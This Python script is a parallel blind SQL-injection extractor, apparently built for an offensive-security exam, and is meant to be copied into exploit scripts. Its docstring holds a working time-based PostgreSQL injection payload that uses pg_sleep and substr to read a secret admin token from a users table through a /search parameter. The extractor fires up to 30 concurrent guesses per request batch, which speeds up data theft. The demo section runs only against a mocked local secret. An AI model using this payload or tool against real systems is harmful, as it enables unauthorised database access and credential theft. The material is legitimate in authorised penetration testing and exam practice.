#!/usr/bin/env python3
"""
Blind SQLi extractor with parallel worker threads.

A blind SQLi leaks one character per request. Pulling a long value one request
at a time is slow, so this fires every (position, character) guess at once
through a thread pool and keeps whichever guess comes back true at each position.

How to use (copy extract_string_blind into your exploit script):

You only write ONE function - is_correct_char(index, char) - that returns True
when `char` is the correct character at position `index` (1-based). Pass it to
extract_string_blind() and it pulls the whole string for you. Everything
target-specific (session, URL, the SQLi payload) goes inside that one function.

Example - time-based blind SQLi on PostgreSQL:

    def is_correct_char(index: int, char: str) -> bool:
        # Asks the DB: "is character <index> of the secret == <char>?
        # If yes, sleep 3s." A slow response then means the guess was right.
        # $$...$$ is Postgres dollar-quoting - it drops <char> in safely even
        # when <char> is a quote or other special character.
        payload = (
            "1 AND (SELECT CASE WHEN "
            f"substr((SELECT secret FROM users LIMIT 1), {index}, 1) = $${char}$$ "
            "THEN pg_sleep(3) ELSE pg_sleep(0) END)"
        )
        start = time.time()
        session.get(TARGET + "/search", params={"id": payload})
        return time.time() - start >= 3   # delayed response => correct char

    secret = extract_string_blind(is_correct_char, length=32, label="admin token")
    print(secret)
"""

import concurrent.futures
import string
import sys
import time

# ==============================================================================
# PARALLEL BLIND EXTRACTOR (copy this section to your main script)
# ==============================================================================

def extract_string_blind(
    check_fn,
    length: int,
    charset: str = string.ascii_letters + string.digits + string.punctuation,
    max_workers: int = 30,
    label: str = "value",
) -> str:
    """
    Extract a fixed-length string via blind SQLi using parallel threads.

    Args:
        check_fn    : callable(index: int, char: str) -> bool
                      Your blind SQLi function. Return True if `char` is correct
                      at 1-based position `index`.
        length      : Number of characters to extract.
        charset     : Characters to test at each position.
        max_workers : Thread pool size. 30 worked well on the exam.
        label       : Display label shown in the progress line.

    Returns:
        The extracted string.

    Notes:
        - All (index, char) tasks are submitted upfront; the pool caps concurrency.
        - Thread-safe: results dict is only written once per index (first True wins).
        - Progress is printed in-place with \\r so the terminal stays clean.
    """
    results: dict[int, str] = {}
    display: list[str] = []

    def worker(index: int, char: str) -> None:
        if check_fn(index, char):
            if index not in results:           # first True at this position wins
                results[index] = char
                current = "".join(v for _, v in sorted(results.items()))
                display.clear()
                display.extend(current)
                print(f"\r  [+] Extracting {label}: {''.join(display)}", end="", flush=True)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        for index in range(1, length + 1):
            for char in charset:
                executor.submit(worker, index, char)

    print()  # newline after the in-place progress line
    extracted = "".join(results.get(i, "?") for i in range(1, length + 1))
    return extracted


# ==============================================================================
# STANDALONE DEMO
# ==============================================================================

if __name__ == "__main__":
    print("sqli_parallel.py — copy extract_string_blind() into your exploit script.")
    print()

    # Mock secret: 8-char mix of upper/lower/digits/punctuation.
    SECRET  = "aB3$xK9!"
    CHARSET = string.ascii_letters + string.digits + string.punctuation

    def is_correct_char(index: int, char: str) -> bool:
        # Mock a time-based blind SQLi: every request carries network latency,
        # and a correct char triggers the server-side sleep (the signal).
        # index is 1-based (position 1 = first char), matching SQL's substr().
        correct = (char == SECRET[index - 1])
        time.sleep(0.1 if correct else 0.05)
        return correct

    print(f"Extracting a {len(SECRET)}-char token from a mock time-based blind SQLi:")
    print()

# ==============================================================================
# Without the helper: sequential, one request at a time, stop at first hit.
# ==============================================================================
    t0 = time.time()
    chars = []
    for index in range(1, len(SECRET) + 1):
        for char in CHARSET:
            # show the brute force in action: confirmed prefix + the char being tried
            print(f"\r  [*] Extracting without helper: {''.join(chars)}{char}", end="", flush=True)
            if is_correct_char(index, char):
                chars.append(char)
                break
    seq_result = "".join(chars)
    print(f"\r  [+] Extracting without helper: {seq_result} ", flush=True)
    seq_time   = time.time() - t0
    print(f"  [-] Without helper (sequential, one request at a time, stop at first hit): {seq_time:5.1f}s  ->  {seq_result}")

# ==============================================================================
# With the helper: every (index, char) request fired across the thread pool.
# ==============================================================================
    t0 = time.time()
    par_result = extract_string_blind(is_correct_char, length=len(SECRET), charset=CHARSET, label="with helper")
    par_time   = time.time() - t0
    print(f"  [+] With helper (parallel request fired across the thread pool): {par_time:5.1f}s  ->  {par_result}")

# ==============================================================================
# RESULTS
# ==============================================================================
    print()
    assert seq_result == par_result == SECRET, "Demo failed"
    print(f"  [+] Both correct - the helper was ~{seq_time / par_time:.0f}x faster.")
